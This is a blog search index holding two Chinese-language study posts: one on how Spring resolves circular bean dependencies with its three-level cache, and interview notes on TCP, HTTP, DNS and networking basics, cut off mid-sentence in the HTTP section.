<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Spring怎么解决循环依赖？</title>
      <link href="/2019/10/09/%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/"/>
      <url>/2019/10/09/%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring怎么解决循环依赖？"><a href="#Spring怎么解决循环依赖？" class="headerlink" title="Spring怎么解决循环依赖？"></a>Spring怎么解决循环依赖？</h2><h3 id="循环依赖"><a href="#循环依赖" class="headerlink" title="循环依赖"></a>循环依赖</h3><p>循环依赖是个啥？在创建TestA类时，构需要TestB类，那将去创建TestB，在创建TestB类时又需要TestA，从而形成一个环，没办法创建。</p><p>spring解决这个问题与三特别有缘分，对于三种不同程度的循环依赖，spring能解决的程度不同；而解决的办法正是用到了三级缓存。</p><p>下面就分别来讨论三种不同程度的循环依赖。</p><h3 id="第一种：构造器的循环依赖，无法解决，会报错"><a href="#第一种：构造器的循环依赖，无法解决，会报错" class="headerlink" title="第一种：构造器的循环依赖，无法解决，会报错"></a>第一种：构造器的循环依赖，无法解决，会报错</h3><h4 id="情况"><a href="#情况" class="headerlink" title="情况"></a>情况</h4><p>A的构造方法中依赖了B的实例对象，同时B的构造方法中依赖了A的实例对象</p><h4 id="无法解决原因"><a href="#无法解决原因" class="headerlink" title="无法解决原因"></a>无法解决原因</h4><p>一、Spring容器会将每一个正在创建的Bean 标识符放在一个“当前创建Bean池”中，Bean标识符在创建过程中将一直保持在这个池中，因此如果在创建Bean过程中发现自己已经在“当前创建Bean池”里时将抛出BeanCurrentlyInCreationException异常表示循环依赖；而对于创建完毕的Bean将从“当前创建Bean池”中清除掉。</p><p>Spring容器先创建单例StudentA，StudentA依赖StudentB，然后将A放在“当前创建Bean池”中，此时创建StudentB,StudentB依赖StudentA， 但是，此时StudentA已经在池中，所以会报错，因为在池中的Bean都是未初始化完的，所以会依赖错误 ，（初始化完的Bean会从池中移除）</p><p>二、循环依赖发生的时候还没有执行完构造器，也就无法使用三级缓存解决问题。spring解决循环依赖的手段是三级缓存，而三级缓存的的前提是执行了构造器，才会调用addSingletonFactory加入三级缓存，所以构造器的循环依赖没法解决。这在下面一种情况中会有解释，就先不展开了。</p><h3 id="第二种：field属性的单例循环依赖，可解决。"><a href="#第二种：field属性的单例循环依赖，可解决。" class="headerlink" title="第二种：field属性的单例循环依赖，可解决。"></a>第二种：field属性的单例循环依赖，可解决。</h3><h4 id="情况-1"><a href="#情况-1" class="headerlink" title="情况"></a>情况</h4><p>A的构造方法中依赖了B的实例对象，同时B的某个field或者setter需要A的实例对象</p><h4 id="解决前提"><a href="#解决前提" class="headerlink" title="解决前提"></a>解决前提</h4><ul><li>前提一：比第一种情况，此时循环依赖发生在字段属性中，而不是构造器中。</li><li>前提二：比第三种情况，因为是单例的，所以才会用到三级缓存。</li></ul><p>前提一：<strong>是先实例化在设置对象属性的，否则解决field属性的setter方式单例循环依赖将无从谈起。</strong>先来看看spring bean生命周期的一张图。</p><p><img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/bean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="1564554784479"></p><p>大体的流程就是：实例化&gt;填充属性&gt;initializeBean(调用spring xml中的init 方法)</p><p>循环依赖主要发生在实例化&gt;填充属性这两步。</p><p>前提二：<strong>对于单例来说</strong>，在Spring容器会把对象放在缓存中，而为了解决单例的循环依赖问题，使用了<strong>Spring三级缓存</strong>。</p><h4 id="解决手段"><a href="#解决手段" class="headerlink" title="解决手段"></a>解决手段</h4><p>三级缓存,这三级缓存分别指： </p><ol><li>singletonObjects：单例对象的cache，一级缓存。</li><li>earlySingletonObjects ：提前暴光的单例对象的Cache ，二级缓存。</li><li>singletonFactories ： 单例对象工厂的cache ，三级缓存。</li></ol><p>由上往下，缓存中的bean是逐渐完善的，三级缓存中的bean 是最初始的状态。</p><h4 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程"></a>解决过程</h4><p>“A的某个field或者setter依赖了B的实例对象，同时B的某个field或者setter依赖了A的实例对象”这种循环依赖的情况。</p><p>A首先完成了初始化的第一步，并且将自己提前曝光到<strong>singletonFactories</strong>三级缓存中，此时进行初始化的第二步，发现自己依赖对象B，此时就尝试去get(B)，发现B还没有被create，所以走create流程。</p><p>B在初始化第一步的时候发现自己依赖了对象A，于是尝试get(A)，尝试一级缓存singletonObjects(肯定没有，因为A还没初始化完全)，尝试二级缓存earlySingletonObjects（也没有），尝试三级缓存singletonFactories，由于A提前曝光了，所以B能够通过三级缓存singletonFactory.getObject拿到A对象(虽然A还没有初始化完全，但是总比没有好呀)。</p><p>B拿到A对象后顺利完成了初始化阶段1、2、3，完全初始化之后将自己放入到一级缓存singletonObjects中。此时返回A中，A此时能拿到B的对象顺利完成自己的初始化阶段2、3，最终A也完成了初始化，进去了一级缓存singletonObjects中。</p><p>而且由于B拿到了A的对象引用，所以B现在hold住的A对象完成了初始化。</p><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><h5 id="getSingleton（）"><a href="#getSingleton（）" class="headerlink" title="getSingleton（）"></a>getSingleton（）</h5><p>获取单例的方法，逐层从缓存中取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">getSingleton</span><span class="params">(String beanName, <span class="keyword">boolean</span> allowEarlyReference)</span> </span>&#123;</span><br><span class="line"> <span class="comment">//首先从一级缓存singletonObjects中获取</span></span><br><span class="line">    Object singletonObject = <span class="keyword">this</span>.singletonObjects.get(beanName);</span><br><span class="line"> <span class="comment">//如果获取不到，并且对象正在创建中</span></span><br><span class="line">    <span class="keyword">if</span> (singletonObject == <span class="keyword">null</span> &amp;&amp; isSingletonCurrentlyInCreation(beanName)) &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>.singletonObjects) &#123;</span><br><span class="line">  <span class="comment">//再从二级缓存earlySingletonObjects中获取</span></span><br><span class="line">            singletonObject = <span class="keyword">this</span>.earlySingletonObjects.get(beanName);</span><br><span class="line">            <span class="keyword">if</span> (singletonObject == <span class="keyword">null</span> &amp;&amp; allowEarlyReference) &#123;</span><br><span class="line">                ObjectFactory&lt;?&gt; singletonFactory = <span class="keyword">this</span>.singletonFactories.get(beanName);</span><br><span class="line">                <span class="keyword">if</span> (singletonFactory != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">//从三级缓存singletonFactory获取</span></span><br><span class="line">                    singletonObject = singletonFactory.getObject();</span><br><span class="line">      <span class="comment">//放入二级缓存</span></span><br><span class="line">                    <span class="keyword">this</span>.earlySingletonObjects.put(beanName, singletonObject);</span><br><span class="line">     <span class="comment">//从三级缓存中删除，也就是把bean自动三级移到了二级缓存中</span></span><br><span class="line">                    <span class="keyword">this</span>.singletonFactories.remove(beanName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (singletonObject != NULL_OBJECT ? singletonObject : <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="addSingletonFactory（）"><a href="#addSingletonFactory（）" class="headerlink" title="addSingletonFactory（）"></a>addSingletonFactory（）</h5><p>这段代码发生在createBeanInstance之后，也就是说单例对象此时已经被创建出来(调用了构造器)。这个对象已经被生产出来了，虽然还不完美（还没有进行初始化的第二步和第三步），但是已经能被人认出来了（根据对象引用能定位到堆中的对象），所以Spring此时将这个对象提前曝光出来让大家认识，让大家使用。</p><p>注意：这里有一个细节就是ObjectFactory，<strong>三级缓存的类型是ObjectFactory并非一个bean（还没实例化好呢）。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addSingletonFactory</span><span class="params">(String beanName, ObjectFactory&lt;?&gt; singletonFactory)</span> </span>&#123;</span><br><span class="line">    Assert.notNull(singletonFactory, <span class="string">"Singleton factory must not be null"</span>);</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>.singletonObjects) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.singletonObjects.containsKey(beanName)) &#123;</span><br><span class="line">     <span class="comment">//三级缓存的类型是ObjectFactory</span></span><br><span class="line">            <span class="keyword">this</span>.singletonFactories.put(beanName, singletonFactory);</span><br><span class="line">            <span class="keyword">this</span>.earlySingletonObjects.remove(beanName);</span><br><span class="line">            <span class="keyword">this</span>.registeredSingletons.add(beanName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>知道了这个原理时候，肯定就知道为啥Spring不能解决第一种情况“A的构造方法中依赖了B的实例对象，同时B的构造方法中依赖了A的实例对象”。因为加入singletonFactories三级缓存的前提是执行了构造器，所以构造器的循环依赖没法解决。</p><h3 id="第三种：field属性的prototype循环依赖，无法解决解决，报错"><a href="#第三种：field属性的prototype循环依赖，无法解决解决，报错" class="headerlink" title="第三种：field属性的prototype循环依赖，无法解决解决，报错"></a>第三种：field属性的prototype循环依赖，无法解决解决，报错</h3><h4 id="情况-2"><a href="#情况-2" class="headerlink" title="情况"></a>情况</h4><p>A的某个field或者setter依赖了B的实例对象，同时B的某个field或者setter依赖了A的实例对象。</p><h4 id="不能解决的前提"><a href="#不能解决的前提" class="headerlink" title="不能解决的前提"></a>不能解决的前提</h4><p><strong>因为没有缓存。</strong></p><p>scope=”prototype” 意思是 每次请求都会创建一个实例对象。两者的区别是：有状态的bean都使用Prototype作用域，无状态的一般都使用singleton单例作用域。</p><p><strong>对于“prototype”作用域Bean，Spring容器无法完成依赖注入，因为“prototype”作用域的Bean，Spring容器不进行缓存，因此无法提前暴露一个创建中的Bean。</strong></p><blockquote><p><a href="https://blog.csdn.net/u010644448/article/details/59108799" target="_blank" rel="noopener">Spring循环依赖的三种方式</a></p><p><a href="https://www.jianshu.com/p/6c359768b1dc" target="_blank" rel="noopener">Spring源码初探-IOC(4)-Bean的初始化-循环依赖的解决</a></p><p><a href="https://blog.csdn.net/u010853261/article/details/77940767" target="_blank" rel="noopener">Spring-bean的循环依赖以及解决方式</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> spring </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络——秋招复习笔记</title>
      <link href="/2019/10/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20/"/>
      <url>/2019/10/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20/</url>
      
        <content type="html"><![CDATA[<p><strong>计算机网络</strong></p><p>[TOC]</p><h1 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h1><h2 id="三次握手？四次挥手？"><a href="#三次握手？四次挥手？" class="headerlink" title="三次握手？四次挥手？"></a>三次握手？四次挥手？</h2><h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a><strong>三次握手</strong></h3><p>​                           <img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/%E4%B8%89%E6%8C%A5.png" alt="1564631382230">                       </p><ul><li>请求先由客户端发起。客户端发送SYN = 1和客户端序号c给服务端，同时进入SYN-SENT状态</li><li>服务端收到SYN后需要做出确认，于是发送ACK = 1，同时自己也发送SYN = 1、服务端序号s，还有确认号c + 1，表示想收到的下一个序号。此时服务端进入SYN-RCVD状态</li><li>客户端收到服务端的SYN和ACK，做出确认，发送ACK = 1，以及序号c +１，同时发送确认号s + 1，表示客户端想收到下一个序号。此时客户端和服务端进入ESTABLISHED状态，连接已建立！</li></ul><h3 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a><strong>四次挥手</strong></h3><p>   <img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/%E5%9B%9B%E6%8F%A1.png" alt="1564631391433"></p><ul><li>关闭连接也是先有客户端发起。客户端发送FIN = 1和序号c向服务端请求断开连接。此时客户端进入FIN-WAIT-1状态</li><li>服务端收到FIN后做出确认，发送ACK = 1和服务端序号，还有确认号c + 1表示想要收到的下一个序号。服务端此时还可以向客户端发送数据。此时服务端进入CLOSE-WAIT状态，客户端进入FIN-WAIT-2状态</li><li>服务端没有数据发送时，它向客户端发送FIN= 1、ACK = 1请求断开连接，同时发送服务端序号s以及确认号c + 1。此时服务端进入LAST-ACK状态</li><li>客户端收到后进行确认，发送ACK = 1，以及需要c + 1和确认号s + 1。此时客户端进入TIME-WAIT状态。客户端需要等待2MSL，确保服务端收到了ACK，若这期间客户端没有收到服务端的消息，便可认为服务端收到了确认，此时可以断开连接。客户端和服务端进入CLOSED状态。</li></ul><p>（回复报文都是ACK=1）</p><h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><h4 id="TCP为什么需要三次握手？两次不行吗？"><a href="#TCP为什么需要三次握手？两次不行吗？" class="headerlink" title="TCP为什么需要三次握手？两次不行吗？"></a>TCP为什么需要三次握手？两次不行吗？</h4><p><strong>一方面，三次握手是为了确认双方发送接受的能力，如果没有第三次握手，服务器就不知自己发送消息的能力。</strong></p><p><strong>另一方面，客户端只发一次请求的话，是服务器分不清是一个失效的慢抵达请求还是一个新请求。</strong>这种情况就是客户端发出了两次连接请求，但由于某种原因，使得第一次请求被滞留了。第二次请求先到达后建立连接成功，此后第一次请求终于到达，这是一个失效的请求了，服务端以为这是一个新的请求于是同意建立连接，但是此时客户端不搭理服务端，服务端一直处于等待状态，这样就浪费了资源。假设采用三次握手，由于服务端还需要等待客户端的确认，若客户端没有确认，服务端就可以认为客户端没有想要建立连接的意思，于是这次连接不会生效。</p><h4 id="四次挥手，为什么客户端发送确认后还需要等待2MSL"><a href="#四次挥手，为什么客户端发送确认后还需要等待2MSL" class="headerlink" title="四次挥手，为什么客户端发送确认后还需要等待2MSL?"></a>四次挥手，为什么客户端发送确认后还需要等待2MSL?</h4><p>1.避免最后一个确认报文丢失的情况</p><p>2.为了避免和下一次连接混淆</p><p>因为<strong>第四次挥手客户端发送ACK确有可能丢包</strong>。服务端没有收到，服务端就会再次发送FIN = 1，如果客户端不等待立即CLOSED，客户端就不能对服务端的FIN = 1进行确认。等待的目的就是为了能在服务端再次发送FIN = 1时候能进行确认。如果在时间等待计时器设置的世界2MSL内客户端都没有收到服务端的任何消息，便认为服务端收到了确认。此时可以结束TCP连接。</p><p>MSL(Maximum Segment Lifetime),最长报文段寿命。建议时间为2分钟，可根据具体情况设置的更小一点。</p><h4 id="为什么会出现大量的close-wait？"><a href="#为什么会出现大量的close-wait？" class="headerlink" title="为什么会出现大量的close-wait？"></a>为什么会出现大量的close-wait？</h4><p>在被动关闭连接情况下，在已经接收到FIN，但是还没有发送自己的FIN的时刻，连接处于CLOSE_WAIT状态。</p><p>出现大量close_wait的现象，主要原因是某种情况下对方关闭了socket链接，但是<strong>我方忙与读或者写，没有关闭连接</strong>。代码需要判断socket，一旦读到0，断开连接，read返回负，检查一下errno，如果不是AGAIN，就断开连接。</p><h4 id="SYN-Floold攻击-SYN洪水攻击-？"><a href="#SYN-Floold攻击-SYN洪水攻击-？" class="headerlink" title="SYN Floold攻击 (SYN洪水攻击)？"></a>SYN Floold攻击 (SYN洪水攻击)？</h4><p>在第二次握手之后，服务器维护一个未连接队列，该队列为每个客户端的SYN包（syn=j）开设一个条目，该条目存放等待第三次握手的连接。当服务器收到客户的确认包时，则可建立连接删除该条目。<br>SYN攻击属于DOS攻击（拒绝服务攻击），恶意不断地向服务器发送syn包，这些伪造的SYN包将长时间占用未连接队列，服务器还需要不断的重发直至超时<strong>正常的SYN请求被丢弃，耗费CPU和内存资源。</strong></p><p>一般来说，如果一个系统（或主机）负荷突然升高甚至失去响应，使用<strong>Netstat</strong> 命令能看到大量SYN_RCVD的半连接（数量&gt;500或占总连接数的10%以上），可以认定，这个系统（或主机）遭到了SYN Flood攻击。</p><p>有以下两种比较简单的解决办法：</p><ul><li>第一种是缩短SYN <strong>Timeout</strong>时间，例如设置为20秒以下。</li><li>第二种方法是设置SYN <strong>Cookie</strong>，给每一个请求连接的IP地址分配一个Cookie，如果短时间内连续受到某个IP的重复SYN报文，就认定是受到了攻击，以后从这个IP地址来的包会被一概丢弃。</li></ul><p>而缩短SYN Timeout时间仅在对方<strong>攻击频度不高</strong>的情况下生效，SYN Cookie更依赖于对方使用<strong>真实的IP地址</strong>，如果攻击者配合IP欺骗，比如利用SOCK_RAW随机改写IP报文中的源地址，cookie就毫无用武之地。</p><p>如果是Win2000系统，可以通过修改注册表中<em>SYN攻击时采取保护措施</em>的指数，降低SYN Flood的危害。</p><h4 id="client故障了怎么办？"><a href="#client故障了怎么办？" class="headerlink" title="client故障了怎么办？"></a>client故障了怎么办？</h4><p>TCP会设置一个<strong>保活计时器</strong>，每次收到客户端数据，都重新设置保活计时器，时间通常是两小时，若两小时没有收到客户数据，服务器就发送一个<strong>探测报文段</strong>，以后则每隔75秒钟发送一次，若一连发送了<strong>10个探测报文段</strong>后仍无客户的响应，服务器就认为客户端出了故障，接着关闭这个连接。</p><h2 id="TCP和UDP的区别？"><a href="#TCP和UDP的区别？" class="headerlink" title="TCP和UDP的区别？"></a>TCP和UDP的区别？</h2><p>​     <img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/TCP%E4%B8%8EUDP.png" alt="1564631382230"></p><p>简单总结一下：</p><p>tcp 字节流 首部20-60字节</p><ul><li><p>可靠传输 分组确认号、超时重传 +滑动窗口=连续AQS自动重传请求</p></li><li><p>面向连接 三握四挥</p></li><li><p>流控制 1.滑动窗口：以字节为单位，零窗口有持续计时器    </p><p>​             2.拥塞控制 慢开始 快重传 快恢复（门限值/2） 加法增长乘法减少</p></li></ul><p>场景：文件传输、邮件</p><p>udp 数据报文段 首部8字节</p><p>不可靠 省资源</p><p>场景：即时通信</p><h2 id="可靠传输？流量控制？拥塞控制？"><a href="#可靠传输？流量控制？拥塞控制？" class="headerlink" title="可靠传输？流量控制？拥塞控制？"></a>可靠传输？流量控制？拥塞控制？</h2><p>可靠传输是指</p><ul><li>传输的信道不产生差错（出错重发）</li><li>接受方来得及处理接受到的数据（快了慢点）</li></ul><p>TCP如何实现可靠传输：</p><ul><li><strong>超时重传</strong>，TCP发出一个分组后，它启动一个<strong>定时器</strong>，等接收方确认收到这个分组。如果发送方不能及时收到一个确认，将重传给接收方。<strong>序号</strong>，用于检测丢失的分组和冗余的分组。<strong>确认</strong>，告知对方已经正确收到的分组以及期望的下一个分组 <strong>校验和</strong>，校验数据在传输过程中是否发生改变，如校验有错则丢弃分组；</li><li><strong>滑动窗口/流量控制</strong>，进行流量控制，1.只有当最前一个发送的包的确认收到了（对于接收方来说是按序收到的数据中最高的序号），窗口才能像前移动。比如“确认号是31，表示31之前的都收到了，滑动窗口是20，接受窗口就是31~50，31是期望的序号，其实34、35也收到但不是按序到达。”       2.发送窗口的大小由对方的接收窗口和拥塞窗口的的大小决定（取两者中小的那个），当接收方来不及处理发送方的数据，能提示发送方降低发送的速率，防止包丢失。</li></ul><p>流量控制：用滑动窗口进行流量控制，针对发送双方的一方处理不过来的情况。</p><p>拥塞控制：防止过多的数据注入到网络当中，针对网络中的所有计算机。</p><ul><li>慢开始：先探测一下网络的拥塞程度，由小到大逐渐增加拥塞窗口的大小。指数增长，乘法减少</li><li>拥塞避免：转指数增大变为<strong>加法线性增大</strong>。这样就可以避免增长过快导致网路拥塞，慢慢的增加调整到网络的最佳值。</li><li>快重传：发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段，而不必继续等待设置的重传计时器时间到期。接受方发现M3丢失不会什么什么都不做，即便在接受到M4、M5之后也会一直发送M2的确认，当发送方收到了第四个M2的确认就会重传M3.</li><li>快恢复：快重传的后续处理。收到三个重复确认时，就“乘法减小”,把拥塞窗口减半，但是接下去并不执行慢开始算法（从零开始慢慢试探）；考虑到此时能连续收到3个ACK，说明网络没有拥塞，只是丢失了个别报文段，执行加法原则，有几个ACK就加几个段的字节数。</li></ul><p>参考：<a href="http://www.voidcn.com/article/p-vrdkquop-ms.html" target="_blank" rel="noopener">网络基本功：TCP拥塞控制机制</a></p><h1 id="网络协议"><a href="#网络协议" class="headerlink" title="网络协议"></a>网络协议</h1><h2 id="网络的7层模型了解吗？"><a href="#网络的7层模型了解吗？" class="headerlink" title="网络的7层模型了解吗？"></a>网络的7层模型了解吗？</h2><p><img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/%E4%B8%83%E5%B1%82.png" alt="1564631406937"></p><p>即OSI参考模型。</p><ol><li>应用 http、ftp、web、qq</li><li>表示 编码、压缩、加密解密</li><li>会话 发起会话</li><li>传输 tcp udp</li><li>网络 路由选择</li><li>数据链路 mac的封装和解封</li><li>物理 比特 物理设备标准光纤接口、网线接口</li></ol><p>还有一种TCP/IP五层模型，就是把应用层、表示层、会话层统一归到应用层。借用一张图。</p><h2 id="有了传输层为什么还需要网络层？"><a href="#有了传输层为什么还需要网络层？" class="headerlink" title="有了传输层为什么还需要网络层？"></a>有了传输层为什么还需要网络层？</h2><p>网络层是针对主机与主机之间的服务。而传输层针对的是不同主机进程之间的通信。传输层协议将应用进程的消息传送到网络层，但是它并不涉及消息是怎么在网络层之间传送（这部分是由网络层的路由选择完成的）。网络层真正负责将数据包从源IP地址转发到目标IP地址，而传输层负责将数据包再递交给主机中对应端口的进程。</p><p>打个比方。房子A中的人要向房子B中的人写信。房子中都有专门负责将主人写好的信投递到邮箱，以及从邮箱接收信件后交到主人手中的管家。那么：</p><p> 房子 = 主机</p><p>信的内容 = 应用程序消息</p><p>信封 = 数据包，带有源端口、目的端口、源IP地址、目的IP地址。</p><p>邮递员 = 网络层协议，知道信从哪个房子开始发的，以及最后要送到哪个具体的房子。</p><p>管家 = 传输层协议，负责将信投入到信箱中、以及从信箱中接收信件。知道这封信是谁写的以及要送到谁手上（具体端口号）</p><h2 id="主机A向主机B发送数据，在这个过程中，传输层和网络层做了什么？"><a href="#主机A向主机B发送数据，在这个过程中，传输层和网络层做了什么？" class="headerlink" title="主机A向主机B发送数据，在这个过程中，传输层和网络层做了什么？"></a>主机A向主机B发送数据，在这个过程中，传输层和网络层做了什么？</h2><p>当TCP连接建立之后，应用程序就可使用该连接进行数据收发。应用程序将数据提交给TCP，TCP将数据放入自己的缓存，数据会被当做字节流并进行分段，然后加上TCP头部并提交给网络层。再加上IP头后被网络层提交给到目的主机，目的主机的IP层会将分组提交给TCP，TCP根据报文段的头部信息找到相应的socket，并将报文段提交给该socket，socket是和应用关联的，于是数据就提交给了应用。</p><p>对于UDP会简单些，UDP面向报文段。传输层加上UDP头部递交给网络层，再加上IP头部经路由转发到目的主机，目的主机将分组提交给UDP，UDP根据头部信息找到相应的socket，并将报文段提交给该socket，socket是和应用关联的，于是数据就提交给了应用。</p><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h2 id="浏览器发起HTTP请求后发生了什么？"><a href="#浏览器发起HTTP请求后发生了什么？" class="headerlink" title="浏览器发起HTTP请求后发生了什么？"></a>浏览器发起HTTP请求后发生了什么？</h2><ul><li>当在浏览器输入网址<a href="http://www.baidu.com并敲下回车后：" target="_blank" rel="noopener">www.baidu.com并敲下回车后：</a></li><li>DNS域名解析，将域名<a href="http://www.baidu.com解析成IP地址" target="_blank" rel="noopener">www.baidu.com解析成IP地址</a></li><li>发起TCP三次握手，建立TCP连接。浏览器以一个随机端口（1024~65535）向服务器的80端口发起TCP连接。</li><li>在TCP连接上发起HTTP请求。</li><li>服务端响应HTTP请求，将html代码返回给浏览器。</li><li>浏览器解析html代码，请求html中的资源</li><li>浏览器对页面进行渲染呈现给用户</li></ul><h2 id="DNS域名解析的请求过程？"><a href="#DNS域名解析的请求过程？" class="headerlink" title="DNS域名解析的请求过程？"></a>DNS域名解析的请求过程？</h2><ul><li>先在浏览器自身的DNS缓存中搜索</li><li>如上述步骤未找到，浏览器搜索操作系统本身的DNS缓存</li><li>如果在系统DNS缓存中未找到，则尝试读取hosts文件，寻找有没有该域名对应的IP</li><li>果hosts文件中没找到，浏览器会向本地配置的首选DNS服务器发起域名解析请求 。运营商的DNS服务器首先查找自身的缓存，若找到对应的条目且没有过期，则解析成功。如果没有找到，运营商的DNS代我们的浏览器，以根域名-&gt;顶级域名-&gt;二级域名-&gt;三级域名这样的顺序发起迭代DNS解析请求。</li></ul><h2 id="请求和响应的报文结构（格式）？"><a href="#请求和响应的报文结构（格式）？" class="headerlink" title="请求和响应的报文结构（格式）？"></a>请求和响应的报文结构（格式）？</h2><p>HTTP请求的报文格式：</p><p><img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/request%20%281%29.png" alt="1564631437001"></p><p>HTTP响应的报文格式：</p><p><img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/response.png" alt="1564631450295"></p><h2 id="GET与POST的对比，或者说区别？"><a href="#GET与POST的对比，或者说区别？" class="headerlink" title="GET与POST的对比，或者说区别？"></a>GET与POST的对比，或者说区别？</h2><table><thead><tr><th style="text-align:left"></th><th style="text-align:left">GET</th><th style="text-align:left">POST</th></tr></thead><tbody><tr><td style="text-align:left">后退按钮/刷新</td><td style="text-align:left">无害</td><td style="text-align:left">数据会被重新提交（浏览器应该告知用户数据会被重新提交）。</td></tr><tr><td style="text-align:left">书签</td><td style="text-align:left">可收藏为书签</td><td style="text-align:left">不可收藏为书签</td></tr><tr><td style="text-align:left">编码类型</td><td style="text-align:left">application/x-www-form-urlencoded</td><td style="text-align:left">application/x-www-form-urlencoded or multipart/form-data。为二进制数据使用多重编码。</td></tr><tr><td style="text-align:left">历史</td><td style="text-align:left">参数保留在浏览器历史中。</td><td style="text-align:left">参数不会保存在浏览器历史中。</td></tr><tr><td style="text-align:left">对数据长度的限制</td><td style="text-align:left">是的。当发送数据时，GET 方法向 URL 添加数据；URL 的长度是受限制的（URL 的最大长度是 2048 个字符）。</td><td style="text-align:left">无限制。</td></tr><tr><td style="text-align:left">对数据类型的限制</td><td style="text-align:left">只允许 ASCII 字符。</td><td style="text-align:left">没有限制。也允许二进制数据。</td></tr><tr><td style="text-align:left">安全性</td><td style="text-align:left">与 POST 相比，GET 的安全性较差，因为所发送的数据是 URL 的一部分。  在发送密码或其他敏感信息时绝不要使用 GET ！</td><td style="text-align:left">POST 比 GET 更安全，因为参数不会被保存在浏览器历史或 web 服务器日志中。</td></tr><tr><td style="text-align:left">可见性</td><td style="text-align:left">数据在 URL 中对所有人都是可见的。</td><td style="text-align:left">数据不会显示在 URL 中。</td></tr></tbody></table><ol><li>幂等性</li><li>安全：显示在URL中/历史记录/书签</li><li>数据长度</li><li>二进制</li></ol><h2 id="常见的状态码？"><a href="#常见的状态码？" class="headerlink" title="常见的状态码？"></a>常见的状态码？</h2><ul><li>1XX：信息性状态码，表示接收的请求正在处理</li><li>2XX：成功状态码，表示请求正常处理完毕</li><li>3XX：重定向状态码，表示需要进行附加操作以完成请求</li><li>4XX：客户端错误状态码，表示服务器无法处理请求</li><li>5XX：服务端错误状态码，表示服务器处理请求出错</li></ul><p>常见的状态码有：</p><ul><li>200 OK，请求被正常处理</li><li>301 Move Permanently，永久性重定向</li><li>302 Found，临时性重定向</li><li>400 Bad Request，请求报文中存在语法错误</li><li>403 Forbidden，对请求资源的访问被服务器拒绝</li><li>404 Not Found，在服务器上不能找到请求的资源</li><li>500 Internal Server Error，服务器内部错误</li></ul><h2 id="HTTP-1-0和HTTP-1-1的主要区别是什么？"><a href="#HTTP-1-0和HTTP-1-1的主要区别是什么？" class="headerlink" title="HTTP 1.0和HTTP 1.1的主要区别是什么？"></a>HTTP 1.0和HTTP 1.1的主要区别是什么？</h2><p>HTTP1.0最早在网页中使用是在1996年，那个时候只是使用一些较为简单的网页上和网络请求上，而HTTP1.1则在1999年才开始广泛应用于现在的各大浏览器网络请求中，同时HTTP1.1也是当前使用最为广泛的HTTP协议。 主要区别主要体现在：</p><p><strong>长连接</strong> :详见下一个问题。</p><p><strong>缓存处理</strong> :在HTTP1.0中主要使用header里的If-Modified-Since,Expires来做为缓存判断的标准，HTTP1.1则引入了更多的缓存控制策略例如Entity tag，If-Unmodified-Since, If-Match, If-None-Match等更多可供选择的缓存头来控制缓存策略。</p><p>If-Modified-Since:Thu Apr 2016 00:00:00.意思如果在这个时间点之后有更新，则处理请求，否则，返回304not Modified状态码</p><p>Expires这份缓存你可以用到什么时候</p><p>1.0If-Unmodified-Since/If-Match/ If-None-Match——&gt;如果在这个时间点之后有更新，则处理请求/如果有与请求头请求的资源，就处理请求/请求头：put /sample.html 